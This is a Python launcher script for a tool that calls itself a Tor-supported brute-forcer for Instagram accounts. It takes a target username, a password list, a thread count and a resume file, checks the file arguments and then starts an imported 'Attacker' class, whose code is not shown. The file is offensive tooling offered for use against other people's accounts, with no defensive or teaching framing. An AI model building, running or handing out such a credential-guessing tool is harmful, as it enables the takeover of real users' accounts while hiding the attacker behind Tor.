from sys import argv
from sys import exit as sysexit
from os.path import isfile, exists
from time import sleep
from attacker import Attacker
import argparse

strings = {
    'DESCRIPTION' : 'A tool for brute-forcing instagram accounts, with support for Tor.'
}

parser = argparse.ArgumentParser(description = strings['DESCRIPTION'])
parser.add_argument('username', action = 'store', nargs = '?', default = None)
parser.add_argument('passlist', action = 'store', nargs = '?', default = None)
parser.add_argument('-c', '--continue-scan', action = 'store', default = None, dest = 'saved_scan_file')
parser.add_argument('-t' ,'--threads', action = 'store', default = None, type = int)
parser.add_argument('-o', '--output', action = 'store', nargs = '+', default = None)
parser.add_argument('--config', action = 'store')

args = vars(parser.parse_args())

# validate `args`: numbers
if args['saved_scan_file'] == None:
    if args['username'] == None or args['passlist'] == None:
        parser.error('Not enough arguments: Missing username or passlist')

# validate `args`: values
# these are files. We validate them the same way
file_args = ['passlist', 'saved_scan_file', 'config']

for key in args:
    if args[key] == None:
        continue
    if key in file_args:
        f = args[key]
        if not exists(f):
            parser.error('Could not open %s: No such file or directory.' % f)
        elif not isfile(f):
            parser.error('Could not open %s: Not a file.' % f)

attacker = Attacker(args)
attacker.start()

try:
    attacker.block()
    print()
except KeyboardInterrupt:
    print()
    print(' ==> Exiting... might take a while...')
    attacker.stop()
    attacker.block()
    print()

